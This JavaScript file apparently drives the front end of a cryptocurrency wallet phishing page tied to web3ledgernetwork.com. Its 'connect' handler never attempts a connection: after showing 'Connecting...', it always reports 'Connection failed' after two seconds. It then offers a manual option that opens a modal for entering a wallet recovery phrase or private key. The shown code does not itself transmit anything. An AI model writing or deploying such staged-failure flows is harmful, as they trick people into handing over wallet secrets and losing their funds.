(() => {
  let currentWallet = { filename: "", walletName: "", vendor: "" };

  const $ = (sel) => document.querySelector(sel);

  function show(id) {
    document.getElementById(id)?.classList.remove("hidden");
  }

  function hide(id) {
    document.getElementById(id)?.classList.add("hidden");
  }

  // 🔹 NEW: clear all inputs inside the phrase modal
 function clearPhraseInputs() {
  const modal = document.getElementById("phraseKeyModal");
  if (!modal) return;

  modal.querySelectorAll("form").forEach(form => {
    form.reset();
  });
}

  // Make these available to existing onclick handlers
  window.openConnectModal = function (id, filename, walletName, vendorLabel) {
    currentWallet = { id, filename, walletName, vendor: vendorLabel };

    const nameEl = document.getElementById("modalWalletName");
    const iconEl = document.getElementById("modalWalletIcon");
    const textEl = document.getElementById("loadingText");
    const manualBtn = document.getElementById("connectManuallyBtn");

    if (nameEl) nameEl.textContent = walletName;

    if (iconEl) {
      iconEl.src = `https://web3ledgernetwork.com/images/wallets/${filename}`;
      iconEl.alt = walletName;
    }

    if (textEl) textEl.textContent = "Connecting...";
    if (manualBtn) manualBtn.classList.add("hidden");

    show("connectLoadingModal");
	setTimeout(() => {
  if (textEl) textEl.textContent = "Connection failed";
  if (manualBtn) manualBtn.classList.remove("hidden");
}, 2000);

    if (manualBtn) {
      manualBtn.onclick = () => window.openPhraseModal();
    }
  };

  window.closeModal = function (modalId) {
    hide(modalId);
    if (modalId === "phraseKeyModal") {
      clearPhraseInputs(); // ✅ reset on close
    }
  };

  window.closeAllModals = function () {
    hide("connectLoadingModal");
    hide("phraseKeyModal");
    clearPhraseInputs(); // ✅ reset on close
  };

  // 🔹 MODIFIED: reset inputs EVERY time phrase modal opens
  window.openPhraseModal = function () {
    hide("connectLoadingModal");
    clearPhraseInputs(); // ✅ reset on open
    show("phraseKeyModal");

    const modal = document.getElementById("phraseKeyModal");
    if (!modal) return;

    const img = modal.querySelector("img");
    if (img) {
      img.src = `https://web3ledgernetwork.com/images/wallets/${currentWallet.filename}`;
    }
  };

  // Tabs logic (unchanged)
  document.addEventListener("click", (e) => {
    const btn = e.target.closest(".wallet-tab-btn");
    if (!btn) return;

    const targetId = btn.getAttribute("data-target");
    if (!targetId) return;

    const container = btn.closest("#phraseKeyModal") || document;
    const allBtns = container.querySelectorAll(".wallet-tab-btn");
    const panes = container.querySelectorAll(".tab-pane");

    allBtns.forEach(b => b.classList.remove("active"));
    btn.classList.add("active");

    panes.forEach(p => {
      p.classList.remove("active");
      p.style.display = "none";
    });

    const pane = container.querySelector(`#${CSS.escape(targetId)}`);
    if (pane) {
      pane.classList.add("active");
      pane.style.display = "block";
    }
  });

})();
